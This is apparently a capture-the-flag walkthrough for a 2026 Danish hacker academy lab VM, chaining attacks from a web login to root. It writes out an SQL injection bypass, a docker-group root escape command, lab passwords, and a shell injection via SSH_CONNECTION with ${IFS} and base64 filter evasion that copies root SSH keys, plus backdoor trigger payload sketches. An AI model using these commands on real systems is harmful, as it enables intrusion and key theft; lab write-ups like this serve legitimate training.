# Hackerakademi.dk/challenge - CTF writeup [readme.md]
`Walk through of FE 2026 CTF challenge in connection with FE Hacker Akademi (with files)`


### Basics
- [hackerakademi.dk/challenge](https://hackerakademi.dk/challenge)

```
- 2026 FE CTF challenge
- Code Name: "Operation Bad Primate"
- the flag is on root@printserver 
```
### versions
```sh
- v1.00         # Lars Klingsten | 2026-02-27 | reviewing notes && retesting cmds
```
### Credits: 
```sh
- Author:       # https://hackerakademi.dk/challenge
- Walkthrough:  # Lars Klingsten (hack-fe-2026@ckhansen.dk), incl files 
- Date:         # 2026-02-27
```
### Downloads
```sh
Installations/guidance from the author:
-  https://hackerakademi.dk/challenge

# Download 
curl https://hackerakademi.dk/static/printserver-sha256-224ca178c5add882ea6d5333e47857114b2b4751a7848d2f1af0336bab4674b8.vmdk

# above links were available on 2026-02-27
```

### Disclaimer & Liability: 
```
This CTF writeup is provided solely for educational and training purposes. It describe techniques, vulnerabilities, and exploitation methods that must only be used in controlled environments where you have explicit permission to test and experiment.

The information in these writeups must not be used to compromise systems you do not own or lack authorization to assess. I assume no responsibility for misuse of the material, damage to equipment, data loss, or any other consequences resulting from application of the information.

By reading or using these writeups, you agree to act ethically and comply with all applicable laws.
```
### Ansvarsfraskrivelse:  
```
Denne CTF‑writeup er udelukkende udarbejdet til uddannelses‑ og træningsformål. Den beskriver teknikker, sårbarheder og angrebsmetoder, som kun må anvendes i kontrollerede miljøer, hvor du har udtrykkelig tilladelse til at teste og eksperimentere.

Indholdet må ikke bruges til at kompromittere systemer, du ikke ejer eller har fået klar godkendelse til at undersøge. Jeg påtager mig intet ansvar for misbrug af informationen, skader på udstyr, tab af data eller andre konsekvenser, der måtte opstå ved anvendelse af materialet 

Ved at læse eller anvende disse writeups accepterer du at handle etisk og overholde gældende lovgivning.
```

## Overview - Network,  Users
```
YOUR PC (Linux on real hardware and running 'Virtual Machine Manager' )
  └── 192.168.122.0/24 (libvirt/NAT)
        └── 192.168.122.39  ←  PRINTSERVER (bare metal VM, the ultimate target)
              │   user: root
              │   user: vpn 
              │   enp1s0: 192.168.122.39
              │   ve-hostcontvoz3: 192.168.153.241/28  (veth to nspawn)
              │                    169.254.238.218/16
              │
              └── systemd-nspawn container: root@router
                    │   user: root
                    │   vb-router0: 10.0.67.1/24
                    │   vb-router1: 10.0.42.1/24
                    │   vxlan:      10.0.67.1/24  (same IP, overlay)
                    │
                    ├── baby-passes-filters → port 666
                    ├── caas (Go compiler)  → port 80
                    │
                    ├── 10.0.67.x network (vb-router0):
                    │     10.0.67.110  (06:00:52:f6:f8:ab)
                    │     10.0.67.199  (2e:1c:30:bd:34:7e)
                    │     10.0.67.102  (fe:83:d4:69:d7:80)
                    │
                    └── 10.0.42.x network (vb-router1):
                          10.0.42.94 / hostcontainer (4e:a9:d0:48:af:5d)
                                │   SH Port: 2222  
                                │
                                └── Docker containers:
                                      SSH Port: 22 (mapped through hostcontainer)
                                      172.17.0.2  pamela@  (uid in docker group)
                                      172.17.0.2  user@     <-- exploit chain starts here 

```

## Overview - Exploit Chain 
```
Start the challenge by gaining access via user@docker, and as per the chart moving from the botton upwards to towards root@printserver, where the flag file '2022-04-sales.txt' is.

1. user@docker
- ssh user@192.168.122.39 -p 22
- Gained access via SQL Injection on the HTTP server (Port 80).

2. pamela@docker
- ssh pamela@192.168.122.39 -p 22
- Gained access via writing pwd script to satisfy password manager `pam_pamela.so`
- Password: `2VWxyz|22|zyxWV2`.
- member of `pwpolicy` (Group 1337) and `docker` (Group 103).

3. root@router
- Location: `router` nspawn container (10.0.42.1).
- Gained access via privilege escalation to root via pamela membership of the `docker` group

4. vpn@printserver
- Location: `PRINTSERVER` Bare Metal VM (192.168.122.39).
- Access via: Credentials discovered in a file while moving through the network.
- Role: User account (UID 1000) on the primary host.

5. root@printserver
- Location: `PRINTSERVER` Bare Metal VM — The Ultimate Objective.
- Access via: Python injection (Privilege Escalation) to gain full administrative control of the root system.
- flag (ctf): 2022-04-sales.txt
```

# Walk-Through
## Pre-requisites 
```
- use any standard linux [ubuntu, debian] - or kali - but is not required
- install virtual machine manager (see instruction @downloads above)
- download and run download vm (see instructions @downloads above)
- run sha256sum on the downloaded image and compare the website with your own sum
- find your VMs IP addr -> my IP is *192.168.122.39*  (see 'virtual machine manager') 
```

## you@your_pc | Task 1 | Find the attack surface (open ports) on your vm 
```sh
nmap -sV -sC -p- 192.168.122.39
 
#output:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 10:08 CET
    Nmap scan report for 192.168.122.39
    Host is up (0.00036s latency).
    Not shown: 65530 closed tcp ports (conn-refused)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
    80/tcp   open  http
    |_http-title: Vault Login
    | http-robots.txt: 1 disallowed entry
    |_/../
    | fingerprint-strings:
    |   GetRequest, HTTPOptions:
    |     HTTP/1.0 200 OK
    |     Content-Type: text/html; charset=utf-8
    |     Date: Sat, 28 Feb 2026 09:08:42 GMT
    |     <!DOCTYPE html>
    |     [... etc ...]
    2200/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
    2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
    5355/tcp open  llmnr?

#Comments:
    port 22   -> docker, users = [user, pamela]
    port 2222 -> hostcontainer, users = [root]
    port 2200 -> printserver,  users = [vpn, root] 
    port 80   -> http server
```

### you@your_pc | Task 1 | test ports 
```sh
    # ssh servers (3)
    ssh -p 22  192.168.122.39 
    ssh -p 2222 192.168.122.39 
    ssh -p 2200 192.168.122.39

#Comments:
    - all ssh connections works, and all requires a password
    - you do not known any password 
```

```sh
# http
curl http://192.168.122.39 

# You may optionally open this url http://192.168.122.39 
# in your browser, if you want the web page nice layout 

#output:
    [...]
    TODO: Check for vulnerabilities before deploying!
    [unsecure, bad AI, etc etc]
    [...]
    <form action="/secrets" method="POST">
        <div class="input-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required autocomplete="username" autofocus>
        </div>
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required autocomplete="current-password">
        </div>
        <button type="submit" class="login-btn">Login</button>
    </form>

#Comments: 
    note: "username" and "password" in the web-form
```

 ### you@your_pc | Task 1 | SQL Injection on the http server
 ```sh
curl -X POST http://192.168.122.39/secrets -d "username=admin' OR '1'='1'--&password=password"

#output:
    <h1>🔐</h1>
    <h2>Secrets</h2>
    <h3>SSH Credentials</h3>
    <pre>Username: user Password: hunter2</pre>

#Comments:
    We found the password for the user named user
```

### you@your_pc | Task 1 | ssh 192.168.122.39, *user* with pwd: *hunter2*
```sh
ssh user@192.168.122.39 -p 22      # success with pwd "hunter2"
ssh user@192.168.122.39 -p 2222    # wrong pwd
ssh user@192.168.122.39 -p 2200    # wrong pwd

#Comments: success!
    - we have successfully gained access to 'user'
    - [α] user@1ee55c34929d:~$ 
```

### Hints | SSH, SSH-COPY-ID | to be used in task 5
- ssh-keys with ssh, ssh-copy-id, ssh will be important in task 5

```sh
# ensure to inspect your  ~/.ssh/ direction,
cd ~/.ssh 
ls -alh

#output:
    -rw-------   1 larsk larsk 1.3K Aug 19  2025 authorized_keys
    -rw-------   1 larsk larsk  411 Sep 25  2024 id_ed25519
    -rw-r--r--   1 larsk larsk  103 Sep 25  2024 id_ed25519.pub
    -rw-------   1 larsk larsk  15K Feb 27 14:28 known_hosts

#if you wish faster access next time, try this:
ssh-copy-id -i ~/.ssh/id_ed25519 user@192.168.122.39 
# use hunter2 as pwd

ssh user@192.168.122.39 -p 22 
# -> ssh access without typing pwd

# note: 
# your own pc sshkey in id_ed25519.pub, is now added to user@1ee55c34929d's authorized_keys
```

## [α] user@1ee55c34929d |  task 2 | crack user pamela password

### [α] user@1ee55c34929d | task 2 | Login as 'user'

```sh
ssh user@192.168.122.39 # user hunter2 as pwd

#output
    [α] user@1ee55c34929d:~$

#Comments
    Success! Login as 'user'
```

### [α] user@1ee55c34929d | task 2 | Search
- Basic OS information [./scripts/os_info.sh](./scripts/os_info.sh)
```sh
# search throught the users files,
 
hints:
# gather further info on the filesystem
./os_info.sh  # see ./scripts_sh

# copy all files to your own pc, if you wish 
scp -P 22 -r user@192.168.122.39:/home ./home/user@1ee55c34929d
```

### [α] user@1ee55c34929d |  task 2 | discovery of pwd 'service'
```sh
cat /tmp/pamela.log # we find failed authentication attempts

#output:
    Got password 'Password123!'
    User is in group 1337 so this module applies to him
    Got username 'pamela'
    Auth result: 7
    Got password 'pamela1234#'
    Auth result: 7
    pam_pamela is running. #  #Comments: pam_pamela -> pwd  service
    Arg 0: groups=1337
    [...]

Comments:
    This may be actually my own ssh login attemts, as pamela?

    Log revealed a custom PAM module called `pam_pamela` that only applies to users in group 1337

    It appears that the program pam_pamela is controlling the login for her

    Lets find it 

find / type -f -name "pam_pamela*" 2>/dev/null # disregards errors

#output:
    /usr/lib/x86_64-linux-gnu/security/pam_pamela.so
```

### [α] user@1ee55c34929d | task 2 | copy pam_pamela.so to your@pc
```bash
# part 1
# [α] user@1ee55c34929d
#Comments:
    we copy pam_pamela.so to you@your_pc to use 'strings' utility that is missing from the container

# lets copy it to /tmp
cp /usr/lib/x86_64-linux-gnu/security/pam_pamela.so /tmp/pam_pamela.so

# part 2: you@your_pc
# copy pam_pamela.so (size 17k) to your current folder on your own your_pc
scp user@192.168.122.39:/tmp/*.so . 
```

### you@your_pc | task 2 |  Analyzing the Binary

```bash
strings pam_pamela.so   # Extract readable strings
 
#output:
    Discovered Password Requirements

    pam_sm_setcred called
    Your password must be at least 10 characters long
    Your password must be at most 20 characters long
    Your password must be ASCII
    Your password must contain an uppercase character
    Your password must contain a lowercase character
    Your password must contain a digit
    Your password must contain a special character
    Your password must contain a roman numeral
    Sum of digits must be a cube
    Your password must have at least %d consecutive letters
    Number of one bits must be greater than or equal to %d
    Number of one bits modulo %d must be zero
    Your password must be a palindrome
```

### you@your_pc | task 2 | Finding Magic (or rather constants) Numbers
```sh
objdump -d pam_pamela.so

#Comments:
    Your #output will quite a bit of assembly.

    cheat!
    by feeding the above items found in 'strings pam_pamela.so' and assembly to your favorite 'AI'

    Or the hard route!
    by using the ghidra to decompile this assembly into C, which is easier to read

you will find the following constants

Assembly
    mov    $0x5,%esi      # 5 consecutive letters required
    mov    $0x3c,%esi     # 0x3c = 60 decimal (minimum one-bits)
    mov    $0x11,%esi     # 0x11 = 17 decimal (modulo value)
```

### you@your_pc | task 2 | Build a Password Generator (... use AI)
- AI generated password: [./scripts/password_crack_pamela.py](./scripts/password_crack_pamela.py)
```sh
#Comments:
    Use AI to create a custom password cracker

    There is a single solution:
    - user pamela pwd is '2VWxyz|22|zyxWV2'
```

### you@your_pc | task 2 | Summary Key Techniques Used
```sh
# Summary
    - Log file analysis, find  '/tmp/pamela.log' showing the log of pwd pam_pamela.so pam_pamela.so
    - find the module 'pam_pamela.so'
    - Binary reverse engineering - 'strings' and 'objdump' to extract requirements
    - Assembly code analysis - Found hardcoded magic numbers '[5, 60, 17]' (used 'AI')
    - Constraint satisfaction - Wrote Python to generate passwords meeting all 13 requirements (used AI)
    - see 'scripts/password_crack_pamela.py' 
    
```

## [β] pamela@1ee55c34929d | Task 3 | Gain access to root@hostcontainer
`- escape pamela container, and gain access to root@hostcontainer`

### [β] pamela@1ee55c34929d | Task 3 | login as pamela
```sh
ssh pamela@192.168.122.39 # pwd is `2VWxyz|22|zyxWV2`
# use ssh-copy-id 
```

### [β] pamela@1ee55c34929d | Task 3 | search high and low 
- Basic OS information [./scripts/os_info.sh](./scripts/os_info.sh)

```sh
# particular interest is:
id 
 
#output:
    uid=1001(pamela) gid=1001(pamela) groups=1001(pamela),100(users),103(docker),1337(pwpolicy)

#Comments:
    We knew that pamela was member of group 1337 (pwpolicy) (as we cracked pamela pwd in task 2)

    More importantly pamela is member of 103(docker)
```

### [β] pamela@1ee55c34929d | Task 3 | to escape upwards root@hostconainer 
```sh
- use pamela 'docker' group membership


docker run --rm -it --privileged --pid=host --net=host -v /:/host alpine chroot /host bash

#output:
  root@hostcontainer:~$

#Comments:
    Success!

    Explanation:
    Docker runs with root privileges, so any user in the docker group can start containers with full control over the host.

    By running a privileged container and mounting / from the host, you expose the host’s real filesystem inside the container.

    Using chroot on that mounted filesystem drops you into a shell running directly as the host’s root user.  
```

### [δ] root@hostcontainer | Task 3 | copy you@your_pc ssh certificate to authorized_keys
```sh
- similar to ssh-copy-id above, except we copy it manually

# Part A | you@your_pc
##Comments:
    # open a new terminal on your own pc, and find/copy your own public ssh key

cat ~/.ssh/id_ed25519.pub

##output:
    ssh-ed25519 AAAAC3NzaCasdfadsfasdfadfasdfr5P+iBGFIwSl7zAHc5B3 me@my_computer

##Comments:
    This is just a random string, yours will be different. 
    The full public key will be required in part 'B'

## Part B | [δ] root@hostcontainer
##Comments:
    run from root@hostcontainer

 cd  ~/.ssh
 ls -alh

#output:
    -rw-r--r-- 1 root root  298 Feb 13 13:30 authorized_keys
    -rw------- 1 root root  411 Jan 28 11:47 id_ed25519
    -rw-r--r-- 1 root root  100 Jan 28 11:47 id_ed25519.pub
    -rw------- 1 root root 1.8K Feb 26 13:22 known_hosts
    -rw-r--r-- 1 root root  568 Feb 23 14:12 known_hosts.old
    -rw-r--r-- 1 root root  183 Jan 28 11:57 ssh-config

cd  ~/.ssh
cat .ssh/authorized_keys

#output:
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG0jLLi+zbOruHI5MER/GDbMr5P+iBGFIwSl7zAHc5B3 root@hostcontainer

#action
    copy your public key from part 1 into authorized_keys 
    - on its own line

##Comments: 
    You can now login directly from 'you@your_pc' to root@hostcontainer

ssh root@192.168.122.39 -p 2222
```

## [δ] root@hostcontainer | Task 4 | gain access to root@router

### you@your_pc | Login as root@hostcontainer
```sh
ssh root@192.168.122.39 -p 2222

#output:
    [δ] root@hostcontainer:~

#Comments:
    You should login immediately, without password

    If you are asked for password, your need to repeat the procedure 'copy you@your_pc own ssh certficate to' again. The password is not available, and access is via ssh keys.
    
    Its also possible to copy the root@hostcontainer's ssh keys 
    [δ] root@hostcontainer
    cat ~/.ssh/id_ed25519
    cat ~/.ssh/id_ed25519.pub
    to you@your_pc (perhaps to ~/root@hostcontainer/)
    
    and the using ssh root@192.168.122.39 -p 2222 -i ~/root@hostcontainer/id_ed25519
```

### [δ] root@hostcontainer | Task 4 | find ssh-config
[δ] root@hostcontainer:~/.ssh$ cat ssh-config
```sh
cd ~/.ssh
ls
cat ssh-config

#output: from ls
    authorized_keys  id_ed25519  id_ed25519.pub  known_hosts  known_hosts.old  ssh-config

#output: from cat ssh-config
    Host hostcontainer
        Hostname printserver
        User root
        Port 2222
        IdentityFile hostcontainer.id_ed25519

    Host router
        ProxyJump hostcontainer
        User root
        IdentityFile router.id_ed25519

#Comments:
    ssh router will gain access to root@router      
```

## [ε] root@router | Task 5 | Gain access to vpn@printserver

### [δ] root@hostcontainer | Task 5 | login ssh router
```sh
ssh router

#output
    [ε] root@router # Success!
```

### [ε] root@router | Task 5 | find vpn@printserver credentials
- Basic OS information [./scripts/os_info.sh](./scripts/os_info.sh)
```sh
# search high and low, see script for hints

cd ~/git/vpn
ls -lah
#output: ls -lah
    -rw-r--r-- 1 root root   87 Jan 28 11:51 connect.sh

cat connect.sh

#output: cat connect.sh 
    #!/bin/bash
    sshpass -p "smirk_september_procedure_washer" ssh -p 2200 vpn@printserver

#Comments:
    vpn@printserver pwd is 'smirk_september_procedure_washer'
```

### [ε] root@router | Task 5 | ssh into vpn@printserver
```sh
# lets try from root@router

ssh vpn@printserver -p 2200 
# using pwd: 'smirk_september_procedure_washer'
 
#output
    [ε] root@router:~/git/vpn# ssh vpn@printserver -p 2200
    ssh: Could not resolve hostname printserver: Name or service not known

#Comments:
    Failed!
```

### [ε] root@hostcontainer | Task 5 | lets ssh into vpn@printserver
```sh
# lets try from root@hostcontainer

ssh vpn@printserver -p 2200
# using pwd: 'smirk_september_procedure_washer'

#output
   [ζ] vpn@printserver:~$

#Comments:
    success!
```

## [ζ] vpn@printserver:~$ | Task 6 | Gain access to root@printserver
`reaching finally the ultimate goal`

### you@your_pc | Login to vpn@printserver 
```sh
# @ you@your_pc:
ssh root@192.168.122.39 -p 2222

# @ [δ] root@hostcontainer:~$ 
ssh vpn@printserver -p 2200 
# pwd:smirk_september_procedure_washer

#output:
    [ζ] vpn@printserver:~$
```

### [ζ] vpn@printserver:~$ | Task 6 | find attack surface
- Basic OS information [./scripts/os_info.sh](./scripts/os_info.sh)
```sh
# search high and low

# Vulnerability
sudo -l # see sudo rights 

#output:
    User vpn may run the following commands on printserver:
        (root) NOPASSWD: /usr/bin/systemctl restart systemd-nspawn@wat.service
        (root) NOPASSWD: /usr/bin/systemctl restart systemd-nspawn@noted.service
        (root) NOPASSWD: /usr/bin/systemctl restart systemd-nspawn@saas.service
        (root) NOPASSWD: /usr/local/bin/vpn.py

#Comments:
    This means we can execute vpn.py  as 'sudo' without root password

    We do not care about the actual functionality of vpn.py
    We are only interested in abusing vulnerabilities with 'NOPASSWD' sudo/root rights

sudo /usr/local/bin/vpn.py   
```

### [ζ] vpn@printserver:~$ | Task 6 | exploit sudo priviliges 
- [./home_users/vpn@printserver/vpn.py](./home_users/vpn@printserver/vpn.py)
- [./scripts/inject.sh](./scripts/inject.sh)
```
# Goal:
    - find/copy the root public and private ssh-keys
    - the ssh keys are found /root/id
    - see command and instructions  ./scripts/inject.sh 
    - allowing us to login in root@printserver, with full access

# Comments:
    - sudo execution right (without password) for /usr/local/bin/vpn.py
    - the python script is here : home_users/vpn@printserver/vpn.py
    - we can not make changes to the file, as only root has file write permissions
 
    As we have sudo rights /usr/local/bin/vpn.py and code that run in this script has root rights. 

 # Comments:
    - see code ./home_users/vpn@printserver/vpn.py
    - or /usr/local/bin/vpn.py   

```
```py
 # the code as following vulnerability

# line 51-52
def main():
    remote, _, local, __ = os.environ["SSH_CONNECTION"].split(" ")


# line 17-20
subprocess.run(
        f"ip link add {ifname} type vxlan id {vxid} remote {remoteaddr} dstport 4789", shell=True,
    )
```
```sh
#Comments
    line 51-52:
    we are able set the os.environ variable!
    The code is expecting 4 variables from the os.environ string, separated by " "
    the variable are : remote, _, local, __ (only 'remote' is used)

    line 17-20:
    as shell=True was set, chars ;, &, \n or inside the remoteaddr variable would be interpreted by the Linux shell as a command separator, allowing us to execute our own code as the root user.
 ```

### [ζ] vpn@printserver:~$ | Task 6 | inject script into /usr/local/bin/vpn.py
```sh
#comments  
    We will inject our shell command via the 'os.environ' (set at the shell)

    lets test the 'pwd' command (Print Working Directory)
    We wish to execute 'pwd' as root via 'vpn.py' and thus set:
    remoteaddr = "fe80::1%eth0;pwd;" # see vpn.py line 51-52

export SSH_CONNECTION="fe80::1%eth0;pwd; 1 fe80::1 1" # pwd
sudo /usr/local/bin/vpn.py

#output:
    Error: any valid address is expected rather than "fe80::1%eth0".
    /home/vpn  # <------------ our 'pwd' command >
    /bin/sh: 1: dstport: not found
    Cannot find device "vpn-18361"
    Cannot find device "vpn-18361"
    Established vxlan vpn connection vpn-18361 to fe80::1%eth0;pwd;

comment: 
    the program partly does fail, however it on fails 'after' failing 
    'executed subprocess' (lines 51-52) 
    
    /home/vpn  # <-- output from 'pwd' cmd

# further need see if we have root rights
export SSH_CONNECTION="fe80::1%eth0;id; 1 fe80::1 1" # id
sudo /usr/local/bin/vpn.py

#output:
    Error: any valid address is expected rather than "fe80::1%eth0".
    uid=0(root) gid=0(root) groups=0(root) # <-- yes, root!
    [...]

#
# lets get the ssh-keys for the 'root'
# via ./script/inject.sh
#

# first attempt (will fail)
# lets inject our script to copy the root sshkey certificates (./script/inject)
export SSH_CONNECTION="fe80::1%eth0;./inject.sh; 1 fe80::1 1" # ./inject.sh
sudo /usr/local/bin/vpn.py

#output:
    Traceback (most recent call last):
    File "/usr/local/bin/vpn.py", line 69, in <module>
    main()
   
    File "/usr/local/bin/vpn.py", line 53, in main

#Comments:
    failed!
    space and . are not allowed, and ./inject has "."

# 2nd attempt (will succeed!)
export SSH_CONNECTION="fe80::1%eth0;sh\${IFS}inject*; 1 fe80::1 1" # ./inject.sh
sudo /usr/local/bin/vpn.py

#output:
    Error: any valid address is expected rather than "fe80::1%eth0".
    hello from inject.sh
    SSH keys copied to /tmp/ssh_loot
    total 12
    drwxr-xr-x 2 vpn  vpn  100 Feb 27 13:14 .
    drwxrwxrwt 8 root root 260 Feb 28 00:27 ..
    -rw-r--r-- 1 vpn  vpn   98 Feb 28 12:26 authorized_keys
    -rw-r--r-- 1 vpn  vpn  411 Feb 28 12:26 id_ed25519
    -rw-r--r-- 1 vpn  vpn   98 Feb 28 12:26 id_ed25519.pub
    goodbye from inject.sh
    /bin/sh: 1: dstport: not found

#Comments:
    Success!

    We have copied
    - id_ed25519
    - id_ed25519.pub
    to /tmp/ssh_loot

#Explanation:
    ${IFS} avoids the split(" "), but the Linux shell expands back into a functional space at runtime.

    "*" we use the wild card to execute any inject* scripts (there is only one script to execute anyway)

    This allow alphanumeric payloads that bypass strict input filters (lines 52 && 55 in the vpn.py) 
    while maintaining full command execution power as root.


# Alternatively:
     use base64 (note to self)

    
INJECT=$(echo -n "./inject.sh" | base64) # -n = no newline
export SSH_CONNECTION="fe80::1%eth0;echo\${IFS}${INJECT}\$|base64\${IFS}-d|sh; 1 fe80::1 1"
sudo /usr/local/bin/vpn.py
```

### [ζ] vpn@printserver:~$ | Task 6 | copy the ssh-keys to your own pc
```sh
# The keys were copied to /tmp/ssh_loot

cd /tmp/ssh_loot
ls -lah

#output:
    -rw-r--r-- 1 vpn  vpn   98 Feb 28 12:42 authorized_keys
    -rw-r--r-- 1 vpn  vpn  411 Feb 28 12:42 id_ed25519
    -rw-r--r-- 1 vpn  vpn   98 Feb 28 12:42 id_ed25519.pub

#Comments 
    # copy/rename the id_ed25519 ssh keys to your own pc like
    ~/source/fe-2026/ssh_keys/id_root_printserver      #  /tmp/ssh_loot/id_ed25519
    ~/source/fe-2026/ssh_keys/id_root_printserver.pub  #  /tmp/ssh_loot/id_ed25519.pub
    chmod 600 id_root_printserver* # Secure permissions (SSH will reject the key otherwise)


```

# [ζ] root@printserver | Task 6 | Login and find the 'flag'
```sh
ssh root@192.168.122.39 -p 2200 -i ~/source/fe-2026/ssh_keys/id_root_printserver

ls -lh

#output
    2022-Q4-sales.txt

cat 2022-Q4-sales.txt

#output
    ... $9,824,101 ...

# Run ONLY if you get crypto formatting error on above 'ssh' command: 
cp id_root_printserver id_root_printserver.bak           # run only once!
cp id_root_printserver.pub id_root_printserver.pub.bak   # run only once!
perl -pe 's/\r\n/\n/g' id_root_printserver | sed 's/[[:space:]]*$//' > id_root_printserver

```

# Other Vulnerabilities 
## NOT NECESSARY TO COMPLETE THE TASK

##  [δ] root@hostcontainer | caas service | go compiler as a service
```sh
Comments
    - Core Service,
    - ref ~/home/larsk~/source/hacking/fe-2026/home/user/network.md
    - no appearent attack surface, as we can not execute the code on 'caas' server itself

 root@hostcontainer
# find 
curl -i -X OPTIONS http://10.0.42.1
for m in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  echo "== $m ==";
  curl -i -X $m http://10.0.42.1;
done

#Output: 
    # GET, DELETE, PATCH -> all fails -> HTTP/1.1 405 Method Not Allowed
    == POST ==
    HTTP/1.1 400 Bad Request
    Content-Type: text/plain; charset=utf-8
    X-Content-Type-Options: nosniff
    Date: Sun, 22 Feb 2026 09:46:59 GMT
    Content-Length: 57
    caas-1167672054.'go:1:1': expected 'package', found 'EOF'

#Comments:
  - 'go:1:1' suggests 'golang' source code can be compiled by the service

# Test - sample go code

```go
// cat main.go
package main
import "fmt"
func main() { 
    fmt.Println("Compiled! Hello!")
 }
```

```sh
curl -X POST http://10.0.42.1  --output hello  --data-binary @main.go
chmod +ux hello
ls -alh

output
  -rwxr-xr-x 1 root root 2.2M Feb 22 10:10 hello

./hello

#Output:
    Compiled! Hello!

#Comments:
    caas, as online golang compiler works

    However no apparant attack surface, and you can only run code as your current user.
```

## router
- Access via: Byte sequence injection (`0x0A...0x79...`) into the `saas` service (Port 666).
- Effect: Breaks the `recv_loop` to execute the PTE1 shellcode and spawn a root shell.

---


##  [δ] root@hostcontainer | SAAS (Synthesizer as a Service) 
- unsolved

```sh
Comments:
    Backdoor, with possible reverse shell, or code execution possibility
   
    // decompiled by ghidra from file 'saas'
    # MAIN()
    int main(int argc,char **argv) {
    [...]
    recv_loop(recv_note); // continued loop, unless special conditions meet
    execvp(*argv,argv);   // presumed reverse shell
    return 1;
    }

    # RECV_LOOP()
    void recv_loop(_func_void_int_int_int_int *process_note_callback_function) {

    [...]
    do {
        iVar1 = snd_seq_event_input(seq,&snd_seq_event);
        if (iVar1 < 0) {
        return;
        }
        snd_seq_event_note = snd_seq_event->type;
        if (snd_seq_event_note == 10) {       // special byte 10 (0x0a)
                /* This causes the loop to exit and main() which will then call execvp() (*/
        if ((snd_seq_event->data).note.duration == 0x79) { // special byte 0x79
            return;
        }
    }
   
###  SaaS (Synthesizer as a Service)
This service processes ALSA MIDI (sound/Synthesizer)

The service also contains a backdoor (presumably reverse shell) that can be
triggered by streaming special values '0x0a' and '0x79' (see above), with correct padding.

# Memory Layout: 
    The Outer Struct — snd_seq_event
    Offset  Size  Field
    ──────────────────────────────────────────
    0x00     1    type       ← SET THIS TO 0x0A (10)
    0x01     1    flags
    0x02     1    tag
    0x03     1    queue
    0x04     8    time       (snd_seq_timestamp_t)
    0x0C     2    source     (snd_seq_addr_t)
    0x0E     2    dest       (snd_seq_addr_t)
    0x10    12    data       ← starts here (union)

    The Inner Struct — snd_seq_ev_note
    Offset  Size  Field
    ──────────────────────────────
    +0x0     1    channel
    +0x1     1    note
    +0x2     1    velocity
    +0x3     1    off_velocity
    +0x4     4    duration   ← SET THIS TO 0x79

# Trigger (does NOT work)
    ```py
    import socket
    IP_ADR="127.0.0.1"
    TARGET_PORT = 666

    ## As per above memory layout
    payload = ( 
      b"\x0a"       # [0]    type = 10
    + b"\x00" * 3   # [1-3]  flags, tag, queue
    + b"\x00" * 8   # [4-11] time
    + b"\x00" * 4   # [12-15] source + dest
    + b"\x00" * 4   # [16-19] channel, note, velocity, off_velocity
    + b"\x79\x00\x00\x00"  # [20-23] duration = 0x79 LE
    )

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(payload, (IP_ADR, TARGET_PORT))
    print(f"Payload sent to UDP ip={IP_ADR} port={TARGET_PORT}")
```
## robots.txt @ http server port 80
```sh
curl http://192.168.122.39/robots.txt

Output:
    User-agent: *
    Disallow: /../

Comments:
    This mean 'robots' are not allowed to transverse the http server sub directories
    However, this indicates, that this 'may' be an attack surface

    I did not managed to exploit this
```

## [ε] root@router | NODEJS, WASM | V8 Patch |  ~/git/wat:
```sh
the file  ~/git/wat/v8.patch

contains
    +  void JmpRel(FullDecoder* decoder, int32_t value) {
    +    __ jmp_rel(value);
    +  }

Comments:
    Code injection ...

    I did not try exploit this
```

## Baby-Passes-Filters ("Evil" Service)
```sh
# Sadly unsolved
     
Comments:
    Backdoor, with possible reverse shell, or code execution possiblity

Hints:

    The 4 BPF Checks — Every Byte That Must Pass
    Offset  Value        Field
    0x0c    08 00        EtherType = IPv4
    0x17    06           IP.Protocol = TCP
    0x24    02 9a        TCP.dport = 666
    0x36    50 54 45 31  TCP payload = "PTE1"

    Minimal Packet Layout
    [0x00]  ff ff ff ff ff ff  ← Eth DST (any)
    [0x06]  00 00 00 00 00 00  ← Eth SRC (any)
    [0x0c]  08 00              ← ★ EtherType = IPv4
    [0x0e]  45 00 00 3e ...    ← IP header (IHL=5, proto=06)
    [0x17]  06                 ← ★ IP.proto = TCP
    [0x22]  12 34  02 9a       ← SrcPort(any) ★ DstPort=666
    [0x2e]  50                 ← TCP data offset=5 (20-byte hdr)
    [0x36]  50 54 45 31        ← ★ "PTE1" magic
```